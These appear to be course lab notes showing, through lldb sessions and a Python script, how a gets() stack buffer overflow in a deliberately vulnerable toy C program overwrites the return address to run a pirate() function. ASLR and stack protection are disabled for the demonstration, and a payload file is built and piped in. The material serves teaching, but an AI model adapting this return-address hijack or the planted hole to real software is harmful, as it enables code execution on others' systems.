#----------- START HERE
# Disable ASLR for the current session as user root
#  echo 0 | tee /proc/sys/kernel/randomize_va_space
# 
# Enable ASLR again for the current session as user root
#  echo 1 | tee /proc/sys/kernel/randomize_va_space
#
# Compile helloReturnCapture.c with gcc options
#   -Wno-array-bounds -Wno-deprecated-declarations
#   -fno-stack-protector -fomit-frame-pointer


lldb bin/helloReturnCapture

b main
b get_name

run

   32  	}
   33  	
   34  	int main() {
-> 35  		char *name=NULL; 
   36  	
   37  		name = get_name();
   38  	


(lldb) dd
helloReturnCapture, main
    0    0x5555555547a4 <+0>:    subq  $0x18,  %rsp  
->  1    0x5555555547a8 <+4>:    movq  $0x0,  0x8(%rsp)  
    2    0x5555555547b1 <+13>:   movl  $0x0,  %eax  
   *3    0x5555555547b6 <+18>:   callq 0x555555554770  ; get_name
    4    0x5555555547bb <+23>:   movq  %rax,  0x8(%rsp)  
    5    0x5555555547c0 <+28>:   cmpq  $0x0,  0x8(%rsp)  
   *6    0x5555555547c6 <+34>:   je    0x5555555547ee <+74> at helloReturnCapture.c:43 
    7    0x5555555547c8 <+36>:   movq  0x8(%rsp),  %rax  
    8    0x5555555547cd <+41>:   movq  %rax,  %rsi  
    9    0x5555555547d0 <+44>:   leaq  0xfa(%rip),  %rdi  
    10   0x5555555547d7 <+51>:   movl  $0x0,  %eax  
   *11   0x5555555547dc <+56>:   callq 0x555555554610  ; printf
    12   0x5555555547e1 <+61>:   movq  0x8(%rsp),  %rax  
    13   0x5555555547e6 <+66>:   movq  %rax,  %rdi  
   *14   0x5555555547e9 <+69>:   callq 0x5555555545f0  ; free
    15   0x5555555547ee <+74>:   movl  $0x0,  %eax  
    16   0x5555555547f3 <+79>:   addq  $0x18,  %rsp  
   *17   0x5555555547f7 <+83>:   retq    

# Remember
# Return address from the fake is not the normal return address from get_name
#   0x5555555547bb
# but
#   0x5555555547f7  (Line 17)

(lldb) p/x $sp
(unsigned long) $0 = 0x00007fffffffdd70

# print portion of the stack

(lldb) x/64xb $sp
0x7fffffffdd70: 0x60 0xde 0xff 0xff 0xff 0x7f 0x00 0x00
0x7fffffffdd78: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x7fffffffdd80: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x7fffffffdd88: 0x87 0x3c 0xa0 0xf7 0xff 0x7f 0x00 0x00 <- ret addr caller of main
0x7fffffffdd90: 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x7fffffffdd98: 0x68 0xde 0xff 0xff 0xff 0x7f 0x00 0x00
0x7fffffffdda0: 0x00 0x80 0x00 0x00 0x01 0x00 0x00 0x00
0x7fffffffdda8: 0xa4 0x47 0x55 0x55 0x55 0x55 0x00 0x00

(lldb) cont

   22  	char* get_name(){
   23  		char buf[15];
   24
-> 25  		printf("Please insert your surname (15 characters max): ");
   26
   27  		//scanf("%s",buf);
   28  	        // We use the function gets(), which is vulnerable to buffer overflow

# 2 times next

Please insert your surname (15 characters max): Peter

   28  	        // We use the function gets(), which is vurlnerable to buffer overflow
   29  		gets(buf);
   30
-> 31  		return strdup(buf);  // return a copy of the name on the heap
   32  	}


(lldb) x/72xb $sp
0x7fffffffdd50: 0x40 0x50 0x65 0x74 0x65 0x72 0x00 0x00 buf starts at 0x7fffffffdd51
0x7fffffffdd58: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x7fffffffdd60: 0x00 0x48 0x55 0x55 0x55 0x55 0x00 0x00
0x7fffffffdd68: 0xbb 0x47 0x55 0x55 0x55 0x55 0x00 0x00 ret addr to main
0x7fffffffdd70: 0x60 0xde 0xff 0xff 0xff 0x7f 0x00 0x00
0x7fffffffdd78: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x7fffffffdd80: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x7fffffffdd88: 0x87 0x3c 0xa0 0xf7 0xff 0x7f 0x00 0x00 ret addr to caller of main
0x7fffffffdd90: 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00

--- the adhoc script 2 with dump to file

(lldb) script

from __future__ import print_function
import binascii

def store_arch_word_in_blob(blob, size, offset, value):
    blob[offset:offset+size] = value

# for python 2.7
def long_int_to_byte_array(number, endianness):
    byte_array = []
    count = 8
    while count > 0:
        byte_array = [number % 256] + byte_array
        number = number // 256
        count -= 1
    if endianness == 'little':
        return byte_array[::-1]
    else:
        return byte_array

frame = lldb.frame
process = lldb.process
target = lldb.target

arch_size = process.GetAddressByteSize()
pirate_addr = target.EvaluateExpression('&pirate').GetValueAsUnsigned()

addr_buf = frame.FindVariable('buf').GetAddress().load_addr
addr_return_to_main = addr_buf + 15 + 1* arch_size # adapt to stack layout

# create a faked stack content down to 0x7fffffffdd70
# from information read from start of buf downto return address
# from main at 0x7fffffffdd88
# (lldb) expression `sizeof(buf)`
# (int) $20 = 15

size_of_buf = 15
bytes_to_read = size_of_buf + 6 * arch_size

# Read the entire stack blob
err = lldb.SBError()
stack_blob = process.ReadMemory(addr_buf,bytes_to_read, err)

# create new byte array blob of appropriate size
size_to_fake = size_of_buf + 4 * arch_size
newblob = [0] * size_to_fake

# override the buffer with 'A' characters; buf is terminated by initialization with 0
for offset in range(0,size_of_buf-1,1):
    newblob[offset] = 0x41

offset_ret_to_main  = size_of_buf + 1*arch_size
# fake the start address of pirate() as return address
# LLDB version 6.0.0 ubuntu 18.04 uses python 2.7
# LLDB version ????  MacOS 13 uses python 3 already
# https://medium.com/@dattatray.hinge/python-2-int-to-bytes-array-90dc115f6aaa

# Python3:
#store_arch_word_in_blob(newblob, arch_size, offset_ret_to_main, list(pirate_addr.to_bytes(arch_size, byteorder = 'little')))
# Python 2
store_arch_word_in_blob(newblob, arch_size, offset_ret_to_main, list(long_int_to_byte_array(pirate_addr,'little')))

# write the faked return address to main: 0x100003f3e
# Python3:
#store_arch_word_in_blob(newblob, arch_size, offset_ret_to_main + 1* arch_size, list((int(0x100003f3e).to_bytes(arch_size, byteorder = 'little'))))
# Python2:
store_arch_word_in_blob(newblob, arch_size, offset_ret_to_main + 1* arch_size, list(long_int_to_byte_array(int(0x5555555547f7),'little')))

# move return address to function that called main
store_arch_word_in_blob(newblob, arch_size, offset_ret_to_main + 2* arch_size, stack_blob[offset_ret_to_main+4*arch_size:offset_ret_to_main+5*arch_size])


# Write newblob to file
newbuf = bytearray(newblob)
with open ("fakeinput", "wb") as bindata:
    bindata.write(newbuf)


# Write the new stack blob to memory
err = lldb.SBError()
stack_blob = process.WriteMemory(addr_buf,newbuf, err)

# exit script mode

(lldb) x/64xb $sp
0x7fffffffdd50: 0x40 0x41 0x41 0x41 0x41 0x41 0x41 0x41
0x7fffffffdd58: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x00
0x7fffffffdd60: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x7fffffffdd68: 0x5a 0x47 0x55 0x55 0x55 0x55 0x00 0x00
0x7fffffffdd70: 0xf7 0x47 0x55 0x55 0x55 0x55 0x00 0x00
0x7fffffffdd78: 0x87 0x3c 0xa0 0xf7 0xff 0x7f 0x00 0x00
0x7fffffffdd80: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
0x7fffffffdd88: 0x87 0x3c 0xa0 0xf7 0xff 0x7f 0x00 0x00

GOHERE adapt docu


(lldb) dd

(lldb) dd
helloReturnCapture, get_name
    0    0x555555554770 <+0>:    subq  $0x18,  %rsp  
    1    0x555555554774 <+4>:    leaq  0x125(%rip),  %rdi  
    2    0x55555555477b <+11>:   movl  $0x0,  %eax  
   *3    0x555555554780 <+16>:   callq 0x555555554610  ; printf
    4    0x555555554785 <+21>:   leaq  0x1(%rsp),  %rax  
    5    0x55555555478a <+26>:   movq  %rax,  %rdi  
   *6    0x55555555478d <+29>:   callq 0x555555554620  ; gets
->  7    0x555555554792 <+34>:   leaq  0x1(%rsp),  %rax  
    8    0x555555554797 <+39>:   movq  %rax,  %rdi  
   *9    0x55555555479a <+42>:   callq 0x555555554630  ; strdup
    10   0x55555555479f <+47>:   addq  $0x18,  %rsp  
   *11   0x5555555547a3 <+51>:   retq    

GOHERE

# 3* ni

(lldb) dd
helloReturnCapture, get_name
    0    0x100003ec0 <+0>:    subq  $0x18,  %rsp
    1    0x100003ec4 <+4>:    leaq  0xa4(%rip),  %rdi "Please insert your surname (15 characters max): "
    2    0x100003ecb <+11>:   movb  $0x0,  %al
   *3    0x100003ecd <+13>:   callq 0x100003f4c  ; (__TEXT.__stubs) printf
    4    0x100003ed2 <+18>:   leaq  0x9(%rsp),  %rdi
   *5    0x100003ed7 <+23>:   callq 0x100003f46  ; (__TEXT.__stubs) gets
    6    0x100003edc <+28>:   leaq  0x9(%rsp),  %rdi
   *7    0x100003ee1 <+33>:   callq 0x100003f52  ; (__TEXT.__stubs) strdup
    8    0x100003ee6 <+38>:   addq  $0x18,  %rsp
-> *9    0x100003eea <+42>:   retq
    10   0x100003eeb <+43>:   nopl  (%rax, %rax)

(lldb) x/32bx $sp

0x304103528: 0xa0 0x3e 0x00 0x00 0x01 0x00 0x00 0x00
0x304103530: 0x3e 0x3f 0x00 0x00 0x01 0x00 0x00 0x00
0x304103538: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
0x304103540: 0xe0 0x37 0x10 0x04 0x00 0x00 0x00 0x00

# ni

Process 5998 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over
    frame #0: 0x0000000100003ea0 helloReturnCapture` pirate  at helloReturnCapture.c:16
   13  	#include <string.h>
   14  	#include <stdlib.h>
   15
-> 16  	void pirate(){
   17  		printf("Your have been hacked\n");
   18  	}
   19

(lldb) dd
helloReturnCapture, pirate
->  0    0x100003ea0 <+0>:    pushq %rax
    1    0x100003ea1 <+1>:    leaq  0xb0(%rip),  %rdi "You have been hacked!\n"
    2    0x100003ea8 <+8>:    movb  $0x0,  %al
   *3    0x100003eaa <+10>:   callq 0x100003f4c  ; (__TEXT.__stubs) printf
    4    0x100003eaf <+15>:   popq  %rax
   *5    0x100003eb0 <+16>:   retq
    6    0x100003eb1 <+17>:   nopw  %cs:(%rax, %rax)
    7    0x100003ebb <+27>:   nopl  (%rax, %rax)

# 5*ni

You have been hacked!
Process 1067 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = instruction step over
    frame #0: 0x0000000100003eaf helloReturnCapture` pirate  + 15 at helloReturnCapture.c:18
   15
   16  	void pirate(){
   17  		printf("You have been hacked!\n");
-> 18  	}
   19
   20  	char* get_name(){
   21  		char buf[15];


(lldb) dd

helloReturnCapture, pirate
    0    0x100003ea0 <+0>:    pushq %rax
    1    0x100003ea1 <+1>:    leaq  0xb0(%rip),  %rdi "You have been hacked!\n"
    2    0x100003ea8 <+8>:    movb  $0x0,  %al
   *3    0x100003eaa <+10>:   callq 0x100003f4c  ; (__TEXT.__stubs) printf
    4    0x100003eaf <+15>:   popq  %rax
-> *5    0x100003eb0 <+16>:   retq
    6    0x100003eb1 <+17>:   nopw  %cs:(%rax, %rax)
    7    0x100003ebb <+27>:   nopl  (%rax, %rax)

(lldb) 

(lldb) x/32bx $sp
0x304103530: 0x3e 0x3f 0x00 0x00 0x01 0x00 0x00 0x00
0x304103538: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
0x304103540: 0xe0 0x37 0x10 0x04 0x00 0x00 0x00 0x00
0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00


# ni

#
# Note:
# We returned to the fake return address in main()

(lldb) dd
helloReturnCapture, main
    0    0x100003ef0 <+0>:    subq  $0x18,  %rsp
    1    0x100003ef4 <+4>:    movl  $0x0,  0x14(%rsp)
    2    0x100003efc <+12>:   movq  $0x0,  0x8(%rsp)
   *3    0x100003f05 <+21>:   callq 0x100003ec0  ; get_name
    4    0x100003f0a <+26>:   movq  %rax,  0x8(%rsp)
    5    0x100003f0f <+31>:   cmpq  $0x0,  0x8(%rsp)
   *6    0x100003f15 <+37>:   je    0x100003f38 <+72> at helloReturnCapture.c:41:2
    7    0x100003f1b <+43>:   movq  0x8(%rsp),  %rsi
    8    0x100003f20 <+48>:   leaq  0x79(%rip),  %rdi "\nHello %s\n"
    9    0x100003f27 <+55>:   movb  $0x0,  %al
   *10   0x100003f29 <+57>:   callq 0x100003f4c  ; (__TEXT.__stubs) printf
    11   0x100003f2e <+62>:   movq  0x8(%rsp),  %rdi
   *12   0x100003f33 <+67>:   callq 0x100003f40  ; (__TEXT.__stubs) free
    13   0x100003f38 <+72>:   xorl  %eax,  %eax
    14   0x100003f3a <+74>:   addq  $0x18,  %rsp
-> *15   0x100003f3e <+78>:   retq

(lldb) x/32bx $sp
0x304103538: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
0x304103540: 0xe0 0x37 0x10 0x04 0x00 0x00 0x00 0x00
0x304103548: 0x10 0x23 0x01 0x00 0x02 0x00 0x00 0x00
0x304103550: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00

(lldb) cont
Process 1067 resuming
Process 1067 exited with status = 0 (0x00000000)

#------------

$ lldb bin/helloReturnCapture

(lldb) process launch -i fakeinput

Process 4138 launched: '/home/regensbu/git_public_GdP1/CodeExamples/Playground/bin/helloReturnCapture' (x86_64)
Please insert your surname (15 characters max): You have been hacked!
Process 4138 exited with status = 22 (0x00000016) 


#------------
# If we fix the start address of main by disabling ASLR
# are able to use our hack from the command line as well
# Otherwise, we would get a 'Segmentation fault: 11'
# since our faked return addresses are not correct.

cat fakeinput | bin/helloReturnCapture

Please insert your surname (15 characters max): You have been hacked!


